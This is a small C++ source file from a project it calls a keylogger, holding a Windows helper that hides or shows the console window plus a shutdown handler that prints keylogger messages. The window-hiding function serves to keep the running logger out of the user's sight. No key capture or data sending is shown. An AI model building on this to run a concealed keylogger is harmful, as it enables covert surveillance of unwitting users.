#include "../../include/os_manager.h"

#include <Windows.h>
#include <iostream>
#include <csignal>

void OSManager::SetTerminalVisibility(bool isVisible) {
    if (isVisible)
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); 
    else
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
}

void OSManager::GracefulShutdown(int signal) {
    std::cout << "\nGracefully shutting down the keylogger." << std::endl;
    std::cout << "Thanks for using this keylogger!" << std::endl; 
    exit(signal); 
}